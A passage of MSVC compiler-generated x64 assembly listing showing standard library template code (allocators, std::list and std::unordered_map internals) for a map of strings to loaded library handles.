; 948  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 949  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	lea	rdx, QWORD PTR [r8*8]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN17@deallocate

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rax-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN14@deallocate

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rax, rcx
$LN17@deallocate:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rax

; 951  :     }

	add	rsp, 40					; 00000028H

; 258  :         ::operator delete(_Ptr, _Bytes);

	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN14@deallocate:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN20@deallocate:
?deallocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z ENDP ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAAEAMXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAAEAMXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Max_bucket_size, COMDAT

; 1798 :         return _Traitsobj._Get_max_bucket_size();

	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A

; 1799 :     }

	ret	0
?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAAEAMXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Max_bucket_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Getal, COMDAT

; 1850 :         return _Mypair._Get_first();

	mov	rax, rcx

; 1851 :     }

	ret	0
?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??0?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 48
_Al$dead$ = 56
??0?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >, COMDAT

; 802  :     explicit list(const _Alloc& _Al) : _Mypair(_One_then_variadic_args_t{}, _Al) {

$LN41:
	push	rbx
	sub	rsp, 32					; 00000020H

; 353  :     _List_val() noexcept : _Myhead(), _Mysize(0) {} // initialize data

	xor	eax, eax

; 802  :     explicit list(const _Alloc& _Al) : _Mypair(_One_then_variadic_args_t{}, _Al) {

	mov	rbx, rcx

; 353  :     _List_val() noexcept : _Myhead(), _Mysize(0) {} // initialize data

	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax

; 1838 :         auto _Newhead = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new

; 1839 :         _Construct_in_place(_Newhead->_Next, _Newhead);

	mov	QWORD PTR [rax], rax

; 1840 :         _Construct_in_place(_Newhead->_Prev, _Newhead);

	mov	QWORD PTR [rax+8], rax

; 1841 :         _Mypair._Myval2._Myhead = _Newhead;

	mov	QWORD PTR [rbx], rax

; 803  :         _Alloc_sentinel_and_proxy();
; 804  :     }

	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??0?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
;	COMDAT ??0?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@QEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@@Z
_TEXT	SEGMENT
this$dead$ = 8
_Traits$ = 16
??0?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@QEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@@Z PROC ; std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>, COMDAT

; 49   :     explicit _Umap_traits(const _Tr& _Traits) noexcept(is_nothrow_copy_constructible_v<_Tr>) : _Tr(_Traits) {}

	mov	eax, DWORD PTR [rdx]
	mov	DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A, eax
	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	ret	0
??0?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@QEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@@Z ENDP ; std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
this$dead$ = 8
_Right$dead$ = 16
?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators, COMDAT

; 4888 :         _Mypair._Myval2._Swap_proxy_and_iterators(_Right._Mypair._Myval2);
; 4889 :     }

	ret	0
?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ PROC ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::size, COMDAT

; 270  :         return static_cast<size_type>(_Mypair._Myval2._Mylast - _Mypair._Myval2._Myfirst);

	mov	rax, QWORD PTR [rcx+8]
	sub	rax, QWORD PTR [rcx]
	sar	rax, 3

; 271  :     }

	ret	0
?size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ ENDP ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?allocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Count$ = 56
?allocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z PROC ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::allocate, COMDAT

; 953  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN34:
	sub	rsp, 40					; 00000028H

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH
	cmp	rdx, rax
	ja	SHORT $LN30@allocate

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rcx, QWORD PTR [rdx*8]

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	jne	SHORT $LN8@allocate

; 197  :         return nullptr;

	xor	eax, eax

; 954  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 955  :         return static_cast<_Ty*>(_STD _Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 956  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN8@allocate:

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN10@allocate

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	SHORT $LN30@allocate

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN20@allocate

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 954  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 955  :         return static_cast<_Ty*>(_STD _Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 956  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN10@allocate:
	add	rsp, 40					; 00000028H

; 101  :         return ::operator new(_Bytes);

	jmp	??2@YAPEAX_K@Z				; operator new
$LN30@allocate:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN20@allocate:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN32@allocate:
?allocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z ENDP ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::allocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ PROC ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Get_first, COMDAT

; 1504 :         return *this;

	mov	rax, rcx

; 1505 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ENDP ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Alloc_sentinel_and_proxy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
